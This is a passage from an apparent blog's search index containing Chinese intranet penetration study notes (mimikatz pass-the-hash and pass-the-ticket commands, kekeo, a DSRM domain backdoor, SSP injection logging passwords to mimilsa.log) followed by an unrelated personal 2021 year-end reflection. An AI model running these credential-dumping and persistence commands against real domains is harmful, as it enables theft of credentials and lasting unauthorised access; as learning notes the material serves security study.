title="4.3哈希传递"></a>4.3哈希传递</h3><h4 id="使用NTLM-Hash"><a href="#使用NTLM-Hash" class="headerlink" title="#使用NTLM Hash"></a>#使用NTLM Hash</h4><p>在目标机器中，以管理员权限运行mimikatz。</p><h4 id="使用AES-256密钥（AES-128）"><a href="#使用AES-256密钥（AES-128）" class="headerlink" title="#使用AES-256密钥（AES-128）"></a>#使用AES-256密钥（AES-128）</h4><p>使用AES密钥对远程主机进行哈希传递的前提是在本地安装kb2871997。</p><h3 id="4-4票据传递"><a href="#4-4票据传递" class="headerlink" title="4.4票据传递"></a>4.4票据传递</h3><h4 id="使用mimikatz进行票据传递"><a href="#使用mimikatz进行票据传递" class="headerlink" title="#使用mimikatz进行票据传递"></a>#使用mimikatz进行票据传递</h4><p>&#x2F;&#x2F;导出内存中的票据</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;清除内存中票据</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-comment"># kerberos::parge</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;将高权限票据文件注入内存</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> <span class="hljs-string">&quot;kerberos::ptt &quot;</span>c:\ticket\[<span class="hljs-number">0</span>;<span class="hljs-number">4</span>f7cf]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">60</span>a00000-administrator@krbtgt-PENTEST.COM.kirbi<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><h4 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="#使用kekeo进行票据传递"></a>#使用kekeo进行票据传递</h4><p>kekeo需要使用域名、用户名、NTLM Hash三者配合生成票据，再将票据导入，从而直接连接远程计算机。</p><h2 id="0x05-权限维持"><a href="#0x05-权限维持" class="headerlink" title="0x05 权限维持"></a>0x05 权限维持</h2><h4 id="DSRM域后门"><a href="#DSRM域后门" class="headerlink" title="#DSRM域后门"></a>#DSRM域后门</h4><p>DSRM的用途是：允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">NTDSUTIL:打开ntdsutil<br><span class="hljs-keyword">set</span> dsrm <span class="hljs-keyword">password</span>:设置dsrm的密码<br><span class="hljs-keyword">reset</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">server</span> <span class="hljs-keyword">null</span>:在当前域控制器上恢复dsrm密码<br>&lt;<span class="hljs-keyword">password</span>&gt;:修改后的密码<br></code></pre></td></tr></table></figure><p>windows server2008（且安装了kb961320）：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">NTDSUTIL:打开ntdsutil<br><span class="hljs-keyword">SET</span> DSRM <span class="hljs-keyword">PASSWORD</span>:设置dsrm密码<br>SYNC <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">DOMAIN</span> ACCOUNT domainusername:使dsrm的密码和指定域用户的密码同步<br></code></pre></td></tr></table></figure><p><u>注意：如果域控制器的系统版本为windows server 2003，则不能使用该方法进行持久化操作。</u></p><h4 id="SSP维持域控权限"><a href="#SSP维持域控权限" class="headerlink" title="#SSP维持域控权限"></a>#SSP维持域控权限</h4><p>SSP是一个dll文件，主要用来实现windows操作系统的身份认证功能。</p><ol><li><p>使用mimikatz将伪造的ssp注入内存（重启会失效）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>misc::memssp<br><span class="hljs-comment">//密码存储在日志文件C:\\windows\system32\mimilsa.log</span><br></code></pre></td></tr></table></figure></li><li><p>将mimikatz中的mimilib.dll放到系统的C:\Windows\System32\目录下，并将mimilib.dll添加到注册表中。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>#致敬我这混沌的2021</title>
    <link href="/2021/12/31/%E8%87%B4%E6%95%AC%E6%88%91%E8%BF%99%E6%B7%B7%E6%B2%8C%E7%9A%842021/"/>
    <url>/2021/12/31/%E8%87%B4%E6%95%AC%E6%88%91%E8%BF%99%E6%B7%B7%E6%B2%8C%E7%9A%842021/</url>
    
    <content type="html"><![CDATA[<h1 id="致敬我这混沌的2021"><a href="#致敬我这混沌的2021" class="headerlink" title="致敬我这混沌的2021"></a>致敬我这混沌的2021</h1><p>尽管在我看来我的2021好像与前十几年并没有什么不同，终归都是浑浑噩噩，混混沌沌，但临近年末，看着大佬们的年度总结，感慨万千，思来想去总归是该写点文字来纪念2021的。</p><p>对标or@nge神的年度总结，本人在技术，学习以及其他方面好像没有特别能够拿出来详细总结说说。因此，这段文字只是用来记录这个时刻这个阶段的思想态度吧，希望走了一段时间后，能有参照物看看自己的思想变化。</p><h2 id="0x00-伊始"><a href="#0x00-伊始" class="headerlink" title="0x00 伊始"></a>0x00 伊始</h2><p>2021好像是以我转专业到计算机学院开始的。对于非得转专业的缘由，我好像已经记不太清，或许是原专业的枯燥乏味，或许是计算机是风口专业，更或许是我真正所热爱的专业，但不管是何原因，我都是抱着对计算机极大的兴趣来到这里。尽管纵观这一年，好像也没有取得比较令人骄傲的成绩，但比起在原专业的整年摆烂，之后的自学看视频也好，熬夜敲代码也罢，这些都让我找到了阶段性的且积极向上的奋斗力量。因此用一个词概括2021的伊始，或是 踌躇满志 吧。</p><h2 id="0x01-低迷"><a href="#0x01-低迷" class="headerlink" title="0x01 低迷"></a>0x01 低迷</h2><p>也许有学校的原因，也许也是学院的问题，身边的女孩子好像对于专业的态度不是特别认真。对于我这种又懒又缺乏自制力的家伙，缺少学习氛围，对我算的上是致命性的伤害。很快，属于大学的第二学期就那么过去了。匆匆忙忙的期末着实让摸鱼的我有些手忙脚乱，不过还算是勉强过关吧。即使在这个时刻，我也是对于自己的侥幸过关而感到幸运。真正让我认清现实的是，同班同学的综测智育成绩于我高出一大截，其他学校的其他专业的朋友刊登的大大小小的文章以及or@ange神的一纸offer。原来，在我还在为自己的小聪明沾沾自喜的时候，同龄人已经走了这么远了。于是，我急于改变，急于进步，甚至急于出成绩。于是，我想效仿那位出文章的朋友，能够能有导师带带做项目。于是，这样想就这样做了，我在那位朋友的鼓舞下找了祁老师。于是，有了祁老师和我的谈话，以及躺在U盘的一系列资料。但我对算法或是前端的vue框架好像无甚兴趣，便慢慢的荒废了下去。因此，我又陷入了渴望进步又无方向的矛盾之中。</p><h2 id="0x02-改变"><a href="#0x02-改变" class="headerlink" title="0x02 改变"></a>0x02 改变</h2><p>年末，机缘巧合下与or@nge神闲聊上了两句。他向我打开了新世界的大门–安全。不得不说，在此之前，我虽接触了解过开发，前端，软工亦或是软测方向，但对于安全我着实是一筹莫展。不过，我现在才知道安全算是属于信安的一种，与平时的计科有点区别。在or@nge的推荐下，了解了安全的大致学习范围，惊喜地发现这其实是我以前所倾向于的行业。说干就干，视频开始囤开始学。不过，对于我一样刚刚接触这个东西的纯纯小白来说，刚开始地自学犹如狗咬刺猬一样，无从下口。因为种种的原因，我痴迷于橙神的光环。这便造成了我在自学的过程中急于求成。很正常的是，我并不是天赋异禀，也没有橙神那么肝的魄力。意料之中的，我又开始了低迷时期。尽管现在的我可能还是在泥潭里挣扎，但还是很感谢橙神。我愿之将其称为男神的原因，不仅仅是因为他做到的一些成就，更因为他有时候一两句的指导，可能在他看来没什么，但对于那段时间低迷的我算的上是拨开尘雾的光亮了。于是，在2021年的尾巴，我做出了抉择，也摆正了心态。专注自己才是，脚踏实地才是。毕竟平凡的小孩也可以做五彩斑斓的梦，不是嘛？</p><p>年度总结大约就是这样了，最开始下笔的时候，我没想到会有这上千字。在我觉得平淡无味的2021年，其实我好像也有一定的改变和收获。我接受志向满怀的自己，也不否认持续低迷的自己，但更期待做一个热血笨蛋的自己。真切地希望2022年我能够在各个方面热血，学习也好，人际也要是。很合适宜的是，现在耳机里刚好放着《不服》hhh，“我曾经退缩我懦弱我真的幼稚，但我还有路要走”</p><p><strong>仅用以上1400个字致敬我这混沌的2021年。</strong></p><hr><p>永远热血赴山海</p>]]></content>
    
    
    <categories>
      
      <category>总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>年度总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
